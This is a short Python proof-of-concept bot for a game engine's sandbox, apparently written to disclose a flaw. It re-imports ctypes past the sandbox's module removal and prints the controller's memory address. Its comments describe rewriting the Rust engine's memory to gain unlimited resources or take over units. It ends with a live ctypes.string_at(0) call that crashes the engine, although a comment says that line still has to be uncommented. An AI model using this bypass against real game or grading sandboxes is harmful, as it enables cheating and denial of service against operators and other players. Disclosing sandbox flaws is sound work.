from cambc import Direction

class Player:
    def __init__(self):
        # The sandbox attempts to protect the engine by removing dangerous modules:
        # sys.modules.pop('ctypes', None)
        # However, it doesn't block the standard import machinery from re-reading it from disk.
        import ctypes
        self.ctypes = ctypes
        
        print("\n" + "="*50)
        print("[!] MEMORY TRICK PoC: Sandbox Bypass Achieved!")
        print(f"[!] Successfully loaded ctypes from: {ctypes.__file__}")
        print("="*50 + "\n")

    def run(self, controller):
        # We can get the memory address of the PyO3 wrapper for the controller
        addr = id(controller)
        print(f"[!] PoC: Controller memory address is {hex(addr)}")
        
        # --- The Exploit ---
        # With `ctypes` access, a player can use `ctypes.cast` and `ctypes.memmove`
        # to read/write arbitrary process memory from the Rust engine.
        # 
        # For example, since `controller` wraps:
        # pub struct Controller {
        #     game: Rc<RefCell<Game>>,
        #     unit: i32,
        #     has_placed_marker: Cell<bool>,
        # }
        #
        # A player can calculate the PyO3 struct offset and directly modify the `Rc` 
        # or the inner `Game` data to grant themselves unlimited resources, remove 
        # action cooldowns, or change unit ownership.
        
        # As a minimal proof of DoS (crashing the engine), we can trigger a segfault:
        # (Uncomment the line below to instantly crash the Rust engine out of bounds)
        self.ctypes.string_at(0)
        
        pass

